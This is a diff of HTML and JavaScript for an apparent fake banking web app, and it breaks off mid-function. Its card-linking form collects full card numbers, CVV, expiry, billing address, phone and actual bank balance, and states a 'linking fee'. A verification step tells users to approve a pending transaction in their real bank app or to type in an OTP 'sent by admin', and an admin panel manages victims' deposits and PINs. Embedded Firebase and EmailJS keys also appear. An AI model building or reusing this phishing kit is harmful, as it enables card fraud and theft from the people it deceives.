-    <!-- Verification Modal -->
-    <div id="verify-modal" class="modal">
-        <div class="modal-content verify-modal-content">
-            <div class="modal-header">
-                <h3>Verify Your Card</h3>
-                <button class="close-btn" data-modal="verify-modal">×</button>
-            </div>
-            <div class="verify-card-preview">
-                <div class="verify-card-brand" id="verify-card-brand">Visa</div>
-                <div class="verify-card-number" id="verify-card-last4">•••• •••• •••• 0000</div>
-                <div class="verify-card-name" id="verify-card-name">Cardholder</div>
-            </div>
-            <p class="verify-subtitle">Your card has been submitted. Complete one of the steps below to verify ownership.</p>
-            <div class="verify-tabs">
-                <div class="vtab vtab-active" id="vtab-app">Authorize in App</div>
-                <div class="vtab" id="vtab-otp">Enter OTP Code</div>
-            </div>
-            <div id="vpanel-app">
-                <div class="verify-steps">
-                    <div class="verify-step">
-                        <span class="vstep-num">1</span>
-                        <span>Open your banking app on your phone.</span>
-                    </div>
-                    <div class="verify-step">
-                        <span class="vstep-num">2</span>
-                        <span>You will see a pending authorization request or notification.</span>
-                    </div>
-                    <div class="verify-step">
-                        <span class="vstep-num">3</span>
-                        <span>Tap Approve or Authorize inside your bank app.</span>
-                    </div>
-                    <div class="verify-step">
-                        <span class="vstep-num">4</span>
-                        <span>Return here and tap the button below.</span>
-                    </div>
-                </div>
-                <button id="verify-app-done-btn" class="verify-done-btn">✅ I've Authorized in My Bank App</button>
-            </div>
-            <div id="vpanel-otp" style="display:none;">
-                <p class="verify-otp-desc">If your bank sent you a One-Time Password (OTP) by SMS or email, enter it below.</p>
-                <input type="text" id="otp-input" class="otp-input" placeholder="Enter OTP Code" maxlength="8">
-                <button id="otp-submit-btn" class="verify-done-btn">Submit OTP</button>
-            </div>
-            <p class="verify-msg" id="verify-msg"></p>
-        </div>
+  </div>
+  <div class="admin-content" id="acontent-deposits">
+    <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;">&#128176; Deposit Requests</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Approve or reject user deposit requests</div></div>
+    <div id="deposits-list"><p class="acc-empty">Loading...</p></div>
+  </div>
+  <div class="admin-content" id="acontent-codes">
+    <div class="admin-global"><h3>&#128272; Change All PINs</h3>
+      <div class="admin-global-row">
+        <input type="text" class="admin-global-input" id="global-pin" placeholder="New PIN" maxlength="4" inputmode="numeric">
+        <button class="admin-global-btn" id="change-all-pins-btn">Change All</button>
+      </div>
     </div>
+    <div class="admin-section-title">Users by Country</div>
+    <div id="users-list"><p class="acc-empty">Loading...</p></div>
+  </div>
+  <button class="admin-logout" id="admin-logout-btn">Logout</button>
+</div>
 
-    <!-- More Modal -->
-    <div id="more-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>More</h3>
-                <button class="close-btn" data-modal="more-modal">×</button>
-            </div>
-            <div class="more-options">
-                <div class="more-item" id="more-contact">📧 Contact us</div>
-                <div class="more-item" id="more-help">❓ How to use</div>
-                <div class="more-item" id="more-account">👤 Account</div>
-                <div class="more-item" id="more-logout" style="color:var(--pp-red);">🚪 Logout</div>
-            </div>
-        </div>
-    </div>
+<!-- MODALS -->
+<div class="modal" id="notif-modal"><div class="modal-box"><div class="modal-header"><h3>&#128276; Notifications</h3><button class="modal-close" onclick="closeModal('notif-modal')">&#215;</button></div><div id="notif-list"><p style="text-align:center;color:#999;padding:20px;">No notifications</p></div></div></div>
 
-    <!-- Language Modal -->
-    <div id="language-modal" class="modal">
-        <div class="modal-content" style="max-width:300px;">
-            <div class="modal-header">
-                <h3>Language</h3>
-                <button class="close-btn" data-modal="language-modal">×</button>
-            </div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
-                <div id="lb-en" class="lang-btn active-lang" data-lang="en">
-                    EN<br><strong>English</strong>
-                </div>
-                <div id="lb-pt" class="lang-btn" data-lang="pt">
-                    PT<br><strong>Português</strong>
-                </div>
-            </div>
-        </div>
-    </div>
+<div class="modal" id="account-modal"><div class="modal-box"><div class="modal-header"><h3>&#128100; Account Info</h3><button class="modal-close" onclick="closeModal('account-modal')">&#215;</button></div><div class="acct-top-btns"><button class="acct-top-btn" id="copy-acct-btn">&#128203; Copy Account #</button><button class="acct-top-btn" id="gen-pin-btn">&#128273; Generate PIN</button></div><div id="acct-info-rows"></div></div></div>
 
-    <!-- Firebase Scripts -->
-    <script type="module" src="js/app.js"></script>
+<div class="modal" id="card-options-modal"><div class="modal-box center"><div class="modal-header"><h3>&#128179; Cards</h3><button class="modal-close" onclick="closeModal('card-options-modal')">&#215;</button></div><button class="card-option" id="view-cards-btn"><span class="card-option-icon">&#128203;</span><div class="card-option-title">View Linked Cards</div><div class="card-option-desc">See all your linked bank cards and their status</div></button><button class="card-option" id="add-new-card-btn"><span class="card-option-icon">&#10133;</span><div class="card-option-title">Add New Card</div><div class="card-option-desc">Link a new bank card to your account</div></button></div></div>
 
+<div class="modal" id="cards-list-modal"><div class="modal-box"><div class="modal-header"><h3>&#128203; Linked Cards</h3><button class="modal-close" onclick="closeModal('cards-list-modal')">&#215;</button></div><div id="cards-list-content"></div></div></div>
+
+<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title">&#128179; Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-expiry" placeholder="MM/YY" maxlength="5" style="flex:1;"><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" maxlength="4" style="flex:1;"></div><div class="dark-section"><h4>&#128205; Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" style="flex:1;"></div><input type="text" class="modal-input" id="card-country-field" placeholder="Country"><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Bank Balance (e.g. 2500.00)" inputmode="decimal">
+<div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px 14px;margin:6px 0 10px;display:flex;gap:10px;align-items:flex-start;">
+  <div style="font-size:20px;flex-shrink:0;">&#128179;</div>
+  <div>
+    <div style="font-size:12px;font-weight:700;color:#4dabff;margin-bottom:4px;">What is "Current Bank Balance"?</div>
+    <div style="font-size:12px;color:rgba(255,255,255,0.65);line-height:1.5;">This is the actual money you have in your bank account right now — not your card limit. We ask for this to confirm you are the real owner of the card.</div>
+  </div>
+</div>
+<div style="background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.35);border-radius:10px;padding:12px 14px;margin-bottom:8px;display:flex;gap:10px;align-items:flex-start;">
+  <div style="font-size:18px;flex-shrink:0;">&#9888;&#65039;</div>
+  <div style="font-size:12px;color:#ffc107;line-height:1.5;"><strong>Card Linking Fee</strong><br>A small <strong id="card-link-fee">2$</strong> fee will be charged from your card to verify it is active and valid. This is a standard security check.</div>
+</div><div class="modal-error" id="card-error"></div><button class="modal-btn blue" id="card-submit-btn">Link Card</button></div></div>
+
+<div class="modal" id="verify-modal"><div class="modal-box center verify-box"><div class="modal-header"><h3>&#128272; Verify Card</h3><button class="modal-close" onclick="closeModal('verify-modal')">&#215;</button></div><div class="verify-card-preview"><div class="verify-card-brand" id="vc-brand">VISA</div><div class="verify-card-number" id="vc-number">&#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; ----</div><div class="verify-card-holder" id="vc-name">Cardholder</div></div><div class="verify-tabs"><div class="vtab active" id="vtab-app">&#128241; App Auth</div><div class="vtab" id="vtab-otp">&#128290; OTP Code</div></div><div id="vpanel-app"><div class="verify-subtitle">Open your banking app and authorize the verification</div><div class="verify-steps"><div class="verify-step"><div class="vstep-num">1</div><div>Open your bank&#39;s mobile app</div></div><div class="verify-step"><div class="vstep-num">2</div><div>Find the pending verification transaction</div></div><div class="verify-step"><div class="vstep-num">3</div><div>Approve it, then tap Done below</div></div></div><button class="verify-done-btn" id="verify-app-done">Done &#8212; I Authorized It</button></div><div id="vpanel-otp" style="display:none;"><div class="verify-subtitle">Enter the OTP code sent by admin</div><input type="text" class="otp-input" id="otp-input" placeholder="000000" maxlength="6" inputmode="numeric"><button class="verify-done-btn" id="verify-otp-btn" style="margin-top:12px;">Submit OTP</button></div><div class="verify-msg" id="verify-msg"></div></div></div>
+
+<div class="modal" id="add-money-modal"><div class="modal-box"><div class="modal-header"><h3>&#10133; Add Money</h3><button class="modal-close" onclick="closeModal('add-money-modal')">&#215;</button></div><p style="font-size:13px;color:#666;margin-bottom:14px;">Select an authorized card. Deposits require admin approval.</p><div id="addmoney-cards"></div><div id="addmoney-form-section" style="display:none;"><div style="background:#eef2ff;border-radius:8px;padding:10px 14px;font-size:13px;color:#1a56ff;margin-bottom:10px;font-weight:600;" id="addmoney-selected-info"></div><input type="number" class="modal-input" id="addmoney-amount" placeholder="Amount to deposit" min="1" step="0.01"><input type="text" class="modal-input" id="addmoney-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="addmoney-error"></div><button class="modal-btn" id="addmoney-confirm-btn">Submit Deposit Request</button></div></div></div>
+
+<div class="modal" id="transfer-modal"><div class="modal-box"><div class="modal-header"><h3>&#128184; Transfer Funds</h3><button class="modal-close" onclick="closeModal('transfer-modal')">&#215;</button></div><div class="transfer-notice">&#9888;&#65039; You can only transfer to accounts in your name. Processing 1-3 business days.</div><select class="modal-input" id="transfer-method"><option value="">Select Card</option></select><input type="number" class="modal-input" id="transfer-amount" placeholder="Amount" min="1" step="0.01"><input type="text" class="modal-input" id="transfer-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="transfer-error"></div><button class="modal-btn" id="transfer-confirm-btn">Request Transfer</button></div></div>
+
+<div class="modal" id="money-requests-modal"><div class="modal-box"><div class="modal-header"><h3>&#128233; Money Requests</h3><button class="modal-close" onclick="closeModal('money-requests-modal')">&#215;</button></div><div id="money-requests-list"><p style="text-align:center;color:#999;padding:20px;">No pending requests</p></div></div></div>
+
+<div class="modal" id="language-modal"><div class="modal-box center"><div class="modal-header"><h3>&#127760; Language</h3><button class="modal-close" onclick="closeModal('language-modal')">&#215;</button></div><div class="lang-grid"><div class="lang-opt active" onclick="setLang('en',this)">&#127468;&#127463; English</div><div class="lang-opt" onclick="setLang('es',this)">&#127466;&#127480; Espa&ntilde;ol</div><div class="lang-opt" onclick="setLang('fr',this)">&#127467;&#127479; Fran&ccedil;ais</div><div class="lang-opt" onclick="setLang('pt',this)">&#127463;&#127479; Portugu&ecirc;s</div></div></div></div>
+
+<div class="modal" id="more-modal"><div class="modal-box"><div class="modal-header"><h3>&#9881;&#65039; Settings</h3><button class="modal-close" onclick="closeModal('more-modal')">&#215;</button></div><button class="more-item" onclick="closeModal('more-modal');openModal('account-modal')"><span class="more-item-icon">&#128100;</span>Account Info</button><button class="more-item" onclick="alert('Email: admin@atlantasunionbank.com')"><span class="more-item-icon">&#128231;</span>Contact Us</button><button class="more-item" onclick="alert('1. Sign up.\n2. Link and verify a card.\n3. Use Send to transfer money.\n4. Transfer to move funds to your card.')"><span class="more-item-icon">&#10067;</span>How to Use</button><button class="more-item" onclick="openModal('language-modal')"><span class="more-item-icon">&#127760;</span>Language</button><button class="more-item red" id="more-logout"><span class="more-item-icon">&#128682;</span>Log Out</button></div></div>
+
+<script>
+// ── FIREBASE ──
+firebase.initializeApp({
+  apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",
+  authDomain:"viccybank.firebaseapp.com",
+  databaseURL:"https://viccybank-default-rtdb.firebaseio.com",
+  projectId:"viccybank",
+  storageBucket:"viccybank.firebasestorage.app",
+  messagingSenderId:"328465601734",
+  appId:"1:328465601734:web:10e00c00286f1b932273c7"
+});
+var auth = firebase.auth();
+var db   = firebase.database();
+emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});
+
+// ── EMAIL HELPER ──
+// serviceID: 'service_viccy', templateID: 'template_viccy'
+// Template variables: {{to_email}}, {{subject}}, {{message}}
+function sendEmail(toEmail, title, name, message){
+  // user_name = original variable used by template_6f5m0as
+  emailjs.send('service_rs826sa','template_6f5m0as',{
+    user_name: name||title,
+    to_email:  toEmail,
+    title:     title,
+    name:      name,
+    message:   message
+  }).then(function(){
+    console.log('Email sent to '+toEmail);
+  }).catch(function(e){
+    console.warn('EmailJS error:',e);
+  });
+}
+
+// ── CONSTANTS ──
+var ADMIN_EMAIL = 'admin@gmail.com';
+var SYM = {'USD':'$','EUR':'\u20ac','GBP':'\u00a3','NGN':'\u20a6','CAD':'C$','AUD':'A$','JPY':'\u00a5'};
+var BRANDS = {
+  Visa:{bg:'linear-gradient(135deg,#1a1f71,#2d43a8)',logo:'VISA'},
+  Mastercard:{bg:'linear-gradient(135deg,#1a1a1a,#3a3a3a)',logo:'MC'},
+  Amex:{bg:'linear-gradient(135deg,#007bc1,#005a8e)',logo:'AMEX'},
+  Verve:{bg:'linear-gradient(135deg,#00793a,#005a2b)',logo:'VERVE'},
+  Discover:{bg:'linear-gradient(135deg,#f76f20,#c45500)',logo:'DISC'},
+  Card:{bg:'linear-gradient(135deg,#444,#222)',logo:'CARD'}
+};
+var FLAGS = {USA:'🇺🇸',UK:'🇬🇧',Nigeria:'🇳🇬',Germany:'🇩🇪',France:'🇫🇷',Canada:'🇨🇦',Brazil:'🇧🇷',Australia:'🇦🇺',Other:'🌍'};
+
+// ── STATE ──
+var currentUser = null;
+var userRef = null;
+var userData = {};
+var addMoneyCardIdx = -1;
+
+// ── HELPERS ──
+function $(id){ return document.getElementById(id); }
+function sym(){ return SYM[userData.currency||'USD']||'$'; }
+function fmtDate(iso){
+  if(!iso) return '--';
+  var d=new Date(iso);
+  return d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+' \u00b7 '+d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
+}
+function fmtAmt(n){ return parseFloat(n||0).toFixed(2); }
+function notify(uid,msg){
+  var k='n'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
+  return db.ref('notifications/'+uid+'/'+k).set({message:msg,date:new Date().toISOString(),read:false});
+}
+function detectBrand(n){
+  var d=(n||'').replace(/\D/g,'');
+  if(/^4/.test(d)) return 'Visa';
+  if(/^5[1-5]/.test(d)) return 'Mastercard';
+  if(/^3[47]/.test(d)) return 'Amex';
+  if(/^650/.test(d)) return 'Verve';
+  if(/^6(?:011|5)/.test(d)) return 'Discover';
+  return 'Card';
+}
+
+// ── SCREEN ──
+function showScreen(name){
+  ['auth-screen','dashboard','admin-panel'].forEach(function(id){
+    var el=$(id); if(el) el.classList.remove('visible');
+  });
+  var el=$(name); if(el) el.classList.add('visible');
+  var g=$('globe-btn');
+  if(g) g.classList.toggle('show', name!=='auth-screen');
+}
+
+// ── MODALS ──
+function openModal(id){ var m=$(id); if(m) m.classList.add('show'); }
+function closeModal(id){ var m=$(id); if(m) m.classList.remove('show'); }
+
+// ── TABS ──
+function switchTab(tabId,btn){
+  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('active');});
+  var p=$(tabId); if(p) p.classList.add('active');
+  if(btn) btn.classList.add('active');
+}
+
+// ── ADMIN TABS ──
+function switchAdminTab(name){
+  ['auth','deposits','codes'].forEach(function(t){
+    var tab=$('atab-'+t),con=$('acontent-'+t);
+    if(tab) tab.classList.remove('active');
+    if(con) con.classList.remove('active');
+  });
+  var tab=$('atab-'+name),con=$('acontent-'+name);
+  if(tab) tab.classList.add('active');
+  if(con) con.classList.add('active');
+  if(name==='auth') loadAuthTab();
+  else if(name==='deposits') loadDepositsTab();
+  else loadUsersTab();
+}
+
+// ── ACCORDION ──
+function toggleAcc(bodyId,arrowId){
+  var b=$(bodyId),a=$(arrowId);
+  if(!b) return;
+  var open=b.style.display==='block';
+  b.style.display=open?'none':'block';
+  if(a) a.textContent=open?'\u25b6':'\u25bc';
+}
+
+// ── DRAWER ──
+function openDrawer(){ var d=$('drawer'),o=$('drawer-overlay'); if(d)d.classList.add('open'); if(o)o.classList.add('open'); }
+function closeDrawer(){ var d=$('drawer'),o=$('drawer-overlay'); if(d)d.classList.remove('open'); if(o)o.classList.remove('open'); }
+
+// ── LANGUAGE ──
+function setLang(code,el){
+  document.querySelectorAll('.lang-opt').forEach(function(o){o.classList.remove('active');});
+  if(el) el.classList.add('active');
+  closeModal('language-modal');
+}
+
+// ── ACCOUNT NUMBER GENERATOR ──
+function genAccNum(){
+  return new Promise(function(resolve){
+    (function tryIt(){
+      var n=String(Math.floor(1000000000+Math.random()*9000000000));
+      db.ref('accountNumbers/'+n).once('value').then(function(s){ if(s.exists()) tryIt(); else resolve(n); });
+    })();
+  });
+}
+
+// ── FIREBASE AUTH STATE ──
+auth.onAuthStateChanged(function(user){
+  if(!user){ showScreen('auth-screen'); return; }
+  currentUser=user;
+  userRef=db.ref('users/'+user.uid);
+
+  userRef.on('value',function(snap){
+    userData=snap.val()||{};
+    var s=sym();
+    var bal=parseFloat(userData.balance||0);
+    var an=userData.accountNumber||'';
+    var el;
+    el=$('balance'); if(el) el.textContent=bal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+    el=$('currency-symbol'); if(el) el.textContent=s;
+    el=$('acct-badge'); if(el) el.textContent=an?('....'+an.slice(-4)):'....';
+    el=$('topbar-name'); if(el) el.textContent=userData.firstname||'User';
+    el=$('drawer-name'); if(el) el.textContent=(userData.firstname||'')+' '+(userData.surname||'');
+    el=$('drawer-email'); if(el) el.textContent=userData.email||'';
+    var cards=userData.linkedCards||[];
+    var hasAuth=cards.some(function(c){return c&&c.status==='authorized';});
+    el=$('verify-banner'); if(el) el.classList.toggle('show',!userData.verifiedBonus&&!hasAuth);
+    renderCards(cards);
+    renderTx(userData.history||[]);
+    renderReferral();
+    renderAccountInfo();
+    if(user.email===ADMIN_EMAIL){
+      showScreen('admin-panel');
+      loadAuthTab(); loadDepositsTab(); loadUsersTab();
+    } else {
+      showScreen('dashboard');
+    }
+  });
+
+  db.ref('notifications/'+user.uid).on('value',function(snap){
+    var all=[];
+    if(snap.exists()) snap.forEach(function(s){all.push(Object.assign({},s.val(),{id:s.key}));});
+    all.sort(function(a,b){return new Date(b.date)-new Date(a.date);});
+    var unread=all.filter(function(n){return !n.read;}).length;
+    var badge=$('notif-badge');
+    if(badge){badge.textContent=unread>9?'9+':unread; badge.classList.toggle('show',unread>0);}
+    renderNotifications(all);
+  });
+
+  db.ref('moneyRequests/'+user.uid).on('value',function(snap){
+    var pending=[];
+    if(snap.exists()) snap.forEach(function(s){var r=s.val();if(r&&r.status==='pending')pending.push(r);});
+    var banner=$('req-banner'),badge=$('req-count-badge');
+    if(banner) banner.classList.toggle('show',pending.length>0);
+    if(badge) badge.textContent=pending.length+' pending';
+    renderMoneyRequests(pending);
+  });
+});
+
+// ── RENDER CARDS ──
+function renderCards(cards){
+  var con=$('cards-container'); if(!con) return;
+  con.innerHTML='';
+  var valid=(cards||[]).filter(function(c){return c;});
+  if(!valid.length){
+    con.innerHTML='<div style="text-align:center;padding:20px 0;"><div style="font-size:36px;margin-bottom:8px;">'+'\u{1f4b3}'+'</div><div style="color:#999;font-size:14px;">No cards linked yet</div></div>';
+    return;
+  }
+  var stackH=valid.length>1?(105+(valid.length-1)*28):105;
+  var wrap=document.createElement('div');
+  wrap.className='cards-stack-wrap';
+  wrap.style.height=stackH+'px';
+  valid.forEach(function(card,idx){
+    var cfg=BRANDS[card.brand]||BRANDS.Card;
+    var isTop=idx===valid.length-1;
+    var sc=card.status==='authorized'?'rgba(52,211,153,0.3)':card.status==='rejected'?'rgba(255,92,92,0.3)':'rgba(255,193,7,0.3)';
+    var st=card.status==='authorized'?'\u2713 Authorized':card.status==='rejected'?'\u2717 Rejected':'\u29d6 Pending';
+    var sclr=card.status==='authorized'?'#34d399':card.status==='rejected'?'#ff5c5c':'#ffc107';
+    var tile=document.createElement('div');
+    tile.className='card-tile';
+    tile.style.cssText='top:'+(idx*28)+'px;z-index:'+(idx+1)+';background:'+cfg.bg+';';
+    tile.innerHTML=
+      '<div style="display:flex;justify-content:space-between;align-items:center;">'+
+        '<div class="card-chip"></div>'+
+        '<div style="display:flex;align-items:center;gap:8px;">'+
+          '<span style="background:'+sc+';color:'+sclr+';font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;">'+st+'</span>'+
+          '<span style="font-size:13px;font-weight:900;color:#fff;letter-spacing:1px;">'+cfg.logo+'</span>'+
+        '</div>'+
+      '</div>'+
+      '<div style="display:flex;justify-content:space-between;align-items:flex-end;">'+
+        '<div class="card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+(card.lastFour||'----')+'</div>'+
+        '<div><div class="card-expiry-label">Expires</div><div class="card-expiry-val">'+(card.expiry||'--/--')+'</div></div>'+
+      '</div>';
+    if(isTop) tile.onclick=function(){openModal('card-options-modal');};
+    wrap.appendChild(tile);
+  });
+  con.appendChild(wrap);
+  var actRow=document.createElement('div');
+  actRow.className='cards-actions';
+  actRow.innerHTML=
+    '<button class="cards-action-btn" style="background:#f0f4f8;color:#0a2540;" onclick="openModal(\'card-options-modal\')">'+'\u{1f4cb}'+' Manage</button>'+
+    '<button class="cards-action-btn" style="background:#1a56ff;color:#fff;" onclick="openModal(\'card-options-modal\')">+ Add Card</button>';
+  con.appendChild(actRow);
+}
+
+// ── RENDER TRANSACTIONS + RECEIPTS ──
+function renderTx(history){
+  var txCon=$('tx-container'),recCon=$('receipt-container');
+  if(!txCon) return;
+  txCon.innerHTML=''; if(recCon) recCon.innerHTML='';
+  if(!history||!history.length){
+    txCon.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No transactions yet</p>';
+    if(recCon) recCon.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No receipts yet</p>';
+    return;
+  }
+  var s=sym();
+  history.slice().reverse().forEach(function(tx){
+    var isCredit=tx.amount>0;
+    var dateStr=fmtDate(tx.date);
+    var txEl=document.createElement('div');
+    txEl.className='tx-item';
+    txEl.innerHTML=
+      '<div style="display:flex;align-items:center;flex:1;min-width:0;">'+
+        '<div class="tx-icon" style="background:'+(isCredit?'#e6faf0':'#fff0f0')+';">'+(isCredit?'\u2b07\ufe0f':'\u2b06\ufe0f')+'</div>'+
+        '<div class="tx-info">'+
+          '<div class="tx-type">'+(tx.note||tx.type||'Transaction')+'</div>'+
+          '<div class="tx-date">'+dateStr+'</div>'+
+        '</div>'+
+      '</div>'+
+      '<div class="tx-amount '+(isCredit?'credit':'debit')+'">'+(isCredit?'+':'')+s+Math.abs(tx.amount).toFixed(2)+'</div>';
+    txCon.appendChild(txEl);
+    if(recCon){
+      var isSend=tx.type==='Sent', isRecv=tx.type==='Received', isMR=tx.type==='MoneyRequest';
+      var nameLabel=isSend?'Sent To':isRecv?'Received From':isMR?'Counterparty':'Account Holder';
+      var ownName=((userData.firstname||'')+' '+(userData.surname||'')).trim();
+      var nameVal=(isSend||isRecv||isMR)?(tx.counterparty||'--'):ownName;
+      var acctVal=(isSend||isRecv||isMR)?(tx.counterpartyAcct||'--'):(userData.accountNumber||'--');
+      var dateOnly=dateStr.split(' \u00b7 ')[0], timeOnly=dateStr.split(' \u00b7 ')[1]||'';
+      var recEl=document.createElement('div');
+      recEl.className='receipt-card';
+      recEl.innerHTML=
+        '<div class="receipt-head" style="background:'+(isCredit?'linear-gradient(135deg,#00a550,#007a3c)':'linear-gradient(135deg,#e53935,#b71c1c)')+';">'+
+          '<div class="receipt-head-label">Receipt</div>'+
+          '<div class="receipt-head-amount">'+(isCredit?'+':'')+s+Math.abs(tx.amount).toFixed(2)+'</div>'+
+          '<div class="receipt-head-note">'+(tx.note||tx.type||'Transaction')+'</div>'+
+        '</div>'+
+        '<div class="receipt-body">'+
+          '<div class="receipt-row"><span class="receipt-label">'+nameLabel+'</span><span class="receipt-value">'+nameVal+'</span></div>'+
+          '<div class="receipt-row"><span class="receipt-label">Account</span><span class="receipt-value" style="font-family:monospace;">'+acctVal+'</span></div>'+
+          '<div class="receipt-row"><span class="receipt-label">Date</span><span class="receipt-value">'+dateOnly+'</span></div>'+
+          '<div class="receipt-row"><span class="receipt-label">Time</span><span class="receipt-value">'+timeOnly+'</span></div>'+
+          '<div class="receipt-row"><span class="receipt-label">Type</span><span class="receipt-value" style="color:'+(isCredit?'#00a550':'#e53935')+'">'+(isCredit?'Credit \u2193':'Debit \u2191')+'</span></div>'+
+        '</div>';
+      recCon.appendChild(recEl);
+    }
+  });
+}
+
+// ── NOTIFICATIONS ──
+function renderNotifications(all){
+  var list=$('notif-list'); if(!list) return;
+  list.innerHTML='';
+  if(!all.length){list.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No notifications</p>';return;}
+  all.forEach(function(n){
+    var el=document.createElement('div');
+    el.className='notif-item'+(n.read?'':' unread');
+    el.innerHTML='<div class="notif-msg">'+(n.message||'')+'</div><div class="notif-time">'+fmtDate(n.date)+'</div>';
+    el.onclick=function(){ if(!n.read) db.ref('notifications/'+currentUser.uid+'/'+n.id+'/read').set(true); };
+    list.appendChild(el);
+  });
+}
+
+// ── ACCOUNT INFO ──
+function renderAccountInfo(){
+  var con=$('acct-info-rows'); if(!con) return;
+  var rows=[
+    ['Full Name',(userData.firstname||'')+' '+(userData.surname||'')+(userData.othername?' '+userData.othername:'')],
+    ['Account Number',userData.accountNumber||'--'],
+    ['Username',userData.username||'--'],
+    ['Email',userData.email||'--'],
+    ['Phone',userData.phone||'--'],
+    ['Country',userData.country||'--'],
+    ['Currency',userData.currency||'--']
+  ];
+  con.innerHTML=rows.map(function(r){
+    return '<div class="acct-info-row"><span class="acct-info-label">'+r[0]+'</span><span class="acct-info-val">'+r[1]+'</span></div>';
+  }).join('');
+}
+
+// ── REFERRAL ──
+function renderReferral(){
+  var code=userData.referralCode||(currentUser?'AUB-'+currentUser.uid.slice(0,6).toUpperCase():'------');
+  var count=(userData.referrals||[]).length;
+  var s=sym(), earned=count*10;
+  var el;
+  el=$('refer-code-display'); if(el) el.textContent=code;
+  el=$('refer-count'); if(el) el.textContent=count;
+  el=$('refer-earned'); if(el) el.textContent=s+earned;
+  el=$('refer-bar'); if(el) el.style.width=Math.min(100,(count/12)*100)+'%';
+  el=$('refer-bar-label'); if(el) el.textContent=count+' / 12 referrals to claim';
+  el=$('refer-claim-btn');
+  if(el){el.disabled=count<12||userData.referralClaimed; el.textContent=userData.referralClaimed?'Already Claimed':'Claim '+s+(count*10)+' Bonus';}
+}
+
+// ── MONEY REQUESTS ──
+function renderMoneyRequests(pending){
+  var list=$('money-requests-list'); if(!list) return;
+  list.innerHTML='';
+  if(!pending.length){list.innerHTML='<p style="text-align:center;color:#999;padding:20px;">No pending requests</p>';return;}
+  pending.forEach(function(req){
+    var rs=SYM[req.currency||'USD']||'$';
+    var el=document.createElement('div');
+    el.className='req-item';
+    el.innerHTML=
+      '<div class="req-from">\u{1f4e9} '+req.fromName+'</div>'+
+      '<div class="req-amount">'+rs+fmtAmt(req.amount)+'</div>'+
+      (req.note?'<div class="req-note">Note: '+req.note+'</div>':'')+
+      '<div class="req-date">'+fmtDate(req.date)+'</div>'+
+      '<div class="req-btns">'+
+        '<button class="req-accept" onclick="acceptRequest(\''+req.id+'\')">'+'\u2705'+' Accept &amp; Pay</button>'+
+        '<button class="req-decline" onclick="declineRequest(\''+req.id+'\')">'+'\u274c'+' Decline</button>'+
+      '</div>';
+    list.appendChild(el);
+  });
+}
+
+function acceptRequest(reqId){
+  if(!currentUser) return;
+  db.ref('moneyRequests/'+currentUser.uid+'/'+reqId).once('value').then(function(snap){
+    if(!snap.exists()) return alert('Request not found.');
+    var req=snap.val();
+    if(req.status!=='pending') return alert('Already processed.');
+    var amt=parseFloat(req.amount);
+    var rs=SYM[req.currency||'USD']||'$';
+    if(parseFloat(userData.balance||0)<amt){ alert('Insufficient balance. You need '+rs+fmtAmt(amt)); return; }
+    var myName=(userData.firstname||'')+' '+(userData.surname||'');
+    var now=new Date().toISOString();
+    userRef.transaction(function(u){
+      if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];
+        u.history.push({date:now,type:'Sent',amount:-amt,note:'Paid request: '+req.fromName,counterparty:req.fromName,counterpartyAcct:req.fromAcct});}
+      return u;
+    }).then(function(){
+      return db.ref('users/'+req.fromUid).transaction(function(u){
+        if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];
+          u.history.push({date:now,type:'Received',amount:amt,note:'Request accepted by '+myName,counterparty:myName,counterpartyAcct:userData.accountNumber});}
+        return u;
+      });
+    }).then(function(){
+      return db.ref('moneyRequests/'+currentUser.uid+'/'+reqId+'/status').set('accepted');
+    }).then(function(){
+      notify(req.fromUid,'\u2705 '+myName+' paid your request of '+rs+fmtAmt(amt)+'! Added to your balance.');
